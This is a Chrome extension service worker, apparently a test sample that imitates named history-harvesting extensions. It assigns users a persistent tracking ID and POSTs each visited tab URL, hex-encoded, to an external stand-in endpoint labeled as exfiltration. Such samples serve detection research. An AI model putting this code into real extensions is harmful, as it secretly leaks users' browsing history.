// Simulates: redcoolmedia (ohgkmilcibaoempgifldidkidnbkbeii), smartadblocker, WhatRuns
// Pattern: SW listens to tab events and POSTs visited URL to external server.
// This exercises the more common case — fetch triggered by browser events.

const EXFIL_URL = 'https://httpbin.org/post';

// Generate a persistent tracking ID (like redcoolmedia's redcool_key)
chrome.storage.local.get('userId', (result) => {
  if (!result.userId) {
    const id = Math.random().toString(36).slice(2, 12);
    chrome.storage.local.set({ userId: id });
  }
});

// Hex encode URL (like redcoolmedia's bin2hex)
function hexEncode(str) {
  return Array.from(str).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
}

// Report every URL change to the server
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status !== 'complete' || !tab.url) return;
  // Skip extension pages
  if (tab.url.startsWith('chrome-extension://') || tab.url.startsWith('chrome://')) return;

  chrome.storage.local.get('userId', (result) => {
    const userId = result.userId || 'unknown';
    fetch(EXFIL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        type: 'url_exfil',
        url: tab.url,
        urlHex: hexEncode(tab.url),
        userId,
        ts: Date.now(),
      }),
    }).catch(() => {});
  });
});

chrome.tabs.onActivated.addListener((activeInfo) => {
  chrome.tabs.get(activeInfo.tabId, (tab) => {
    if (!tab?.url || tab.url.startsWith('chrome')) return;
    fetch(EXFIL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        type: 'tab_activated',
        url: tab.url,
        ts: Date.now(),
      }),
    }).catch(() => {});
  });
});

// Keep-alive
setInterval(() => {}, 25000);
console.log('[TEST] Tab tracking SW started');
